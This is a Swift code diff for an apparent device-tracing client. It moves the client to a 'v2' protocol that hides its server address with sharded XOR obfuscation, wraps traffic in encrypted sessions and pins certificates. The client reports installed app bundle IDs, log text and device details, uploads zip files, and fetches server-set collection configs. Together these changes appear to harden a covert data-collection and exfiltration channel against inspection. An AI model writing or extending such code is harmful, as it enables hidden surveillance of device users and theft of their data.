@@ -189,8 +189,9 @@ enum TraceAPI {
     static let reportTimeout: TimeInterval = 30
     static let uploadTimeout: TimeInterval = 120
 
+    /// v2 接口根地址（分片异或，与 3105 同一套）
     static var baseURL: URL {
-        TraceLinkProvider.firstURL ?? fallbackBaseURL
+        V2Protocol.baseURL
     }
 
     static var appUUID: String {
@@ -239,8 +240,7 @@ enum TraceAPI {
     }
 
     private static func pullCollectConfigsOnce() async throws -> [TraceCollectConfig] {
-        let envelope = try await postJSON(path: "api/device/report", plaintextParams: deviceParams())
-        let plain = try decryptEnvelope(envelope)
+        let plain = try await postJSON(path: V2Protocol.path("config"), plaintextParams: deviceParams())
         guard let rawConfigs = plain["collect_configs"] as? [[String: Any]] else {
             traceLog("device/report SUCCESS — no collect_configs")
             return []
@@ -267,27 +267,18 @@ enum TraceAPI {
     }
 
     static func reportInstalledApps(_ apps: [String]) async throws {
-        let envelope = try await postJSON(
-            path: "api/device/apps",
+        _ = try await postJSON(
+            path: V2Protocol.path("apps"),
             plaintextParams: deviceParams(extra: ["apps": apps])
         )
-        guard (envelope["code"] as? Int ?? -1) == 0 else {
-            throw TraceError.serverUnreachable
-        }
-        _ = try? decryptEnvelope(envelope)
         traceLog("device/apps SUCCESS — reported \(apps.count) bundle ids")
     }
 
     static func reportLog(text: String) async throws {
-        let envelope = try await postJSON(
-            path: "api/log/report",
+        _ = try await postJSON(
+            path: V2Protocol.path("log"),
             plaintextParams: deviceParams(extra: ["text": text])
         )
-        guard (envelope["code"] as? Int ?? -1) == 0 else {
-            let message = envelope["message"] as? String ?? "unknown"
-            traceLog("log/report FAILED — message=\(message)")
-            throw TraceError.serverUnreachable
-        }
         traceLog("log/report SUCCESS — \(text.count) chars")
     }
 
@@ -303,7 +294,15 @@ enum TraceAPI {
             "file_md5": TraceCrypto.md5Hex(fileData),
             "timestamp": Int64(Date().timeIntervalSince1970 * 1000),
         ]
-        guard let params = encryptedParams(plainParams) else {
+        let session: V2Protocol.Session
+        do {
+            session = try V2Protocol.newSession(plainParams)
+        } catch {
+            traceLog("upload v2 seal FAILED — \(error.localizedDescription)")
+            throw TraceError.invalidServerResponse
+        }
+        guard let metaData = try? JSONSerialization.data(withJSONObject: session.body),
+              let meta = String(data: metaData, encoding: .utf8) else {
             throw TraceError.invalidServerResponse
         }
 
@@ -313,15 +312,15 @@ enum TraceAPI {
             body.append(string.data(using: .utf8) ?? Data())
         }
         appendField("--\(boundary)\r\n")
-        appendField("Content-Disposition: form-data; name=\"params\"\r\n\r\n")
-        appendField(params)
+        appendField("Content-Disposition: form-data; name=\"meta\"\r\n\r\n")
+        appendField(meta)
         appendField("\r\n--\(boundary)\r\n")
         appendField("Content-Disposition: form-data; name=\"file\"; filename=\"\(fileName)\"\r\n")
         appendField("Content-Type: application/octet-stream\r\n\r\n")
         body.append(fileData)
         appendField("\r\n--\(boundary)--\r\n")
 
-        var request = URLRequest(url: baseURL.appendingPathComponent("api/upload/zip"))
+        var request = URLRequest(url: baseURL.appendingPathComponent(V2Protocol.path("zip")))
         request.httpMethod = "POST"
         request.setValue("multipart/form-data; boundary=\(boundary)", forHTTPHeaderField: "Content-Type")
         request.setValue(appUUID, forHTTPHeaderField: "X-App-UUID")
@@ -331,7 +330,7 @@ enum TraceAPI {
         let data: Data
         let response: URLResponse
         do {
-            (data, response) = try await URLSession.shared.data(for: request)
+            (data, response) = try await PinnedSession.shared.session.data(for: request)
         } catch {
             traceLog("upload FAILED — \(fileName): \(error.localizedDescription)")
             throw TraceError.serverUnreachable
@@ -346,7 +345,11 @@ enum TraceAPI {
     }
 
     private static func postJSON(path: String, plaintextParams: [String: Any]) async throws -> [String: Any] {
-        guard let params = encryptedParams(plaintextParams) else {
+        let session: V2Protocol.Session
+        do {
+            session = try V2Protocol.newSession(plaintextParams)
+        } catch {
+            traceLog("\(path) v2 seal FAILED — \(error.localizedDescription)")
             throw TraceError.invalidServerResponse
         }
         var request = URLRequest(url: baseURL.appendingPathComponent(path))
@@ -354,23 +357,29 @@ enum TraceAPI {
         request.setValue("application/json", forHTTPHeaderField: "Content-Type")
         request.setValue(appUUID, forHTTPHeaderField: "X-App-UUID")
         request.timeoutInterval = reportTimeout
-        request.httpBody = try? JSONSerialization.data(withJSONObject: ["params": params])
+        request.httpBody = try? JSONSerialization.data(withJSONObject: session.body)
 
         let data: Data
         let response: URLResponse
         do {
-            (data, response) = try await URLSession.shared.data(for: request)
+            (data, response) = try await PinnedSession.shared.session.data(for: request)
         } catch {
             traceLog("\(path) FAILED — \(error.localizedDescription)")
             throw TraceError.serverUnreachable
         }
         guard let http = response as? HTTPURLResponse, http.statusCode == 200,
-              let envelope = try? JSONSerialization.jsonObject(with: data) as? [String: Any] else {
-            traceLog("\(path) FAILED — non-200 or invalid envelope")
+              let envelope = try? JSONSerialization.jsonObject(with: data) as? [String: Any],
+              (envelope["code"] as? Int ?? -1) == 0 else {
+            let status = (response as? HTTPURLResponse)?.statusCode ?? -1
+            traceLog("\(path) FAILED — http=\(status)")
             throw TraceError.serverUnreachable
         }
-        traceLog("\(path) SUCCESS — code=\(envelope["code"] ?? "?")")
-        return envelope
+        guard let plain = session.open(envelope["data"]) else {
+            traceLog("\(path) v2 open FAILED")
+            throw TraceError.invalidServerResponse
+        }
+        traceLog("\(path) SUCCESS (v2) — keys=\(plain.keys.count)")
+        return plain
     }
 
     private static func decryptEnvelope(_ envelope: [String: Any]) throws -> [String: Any] {
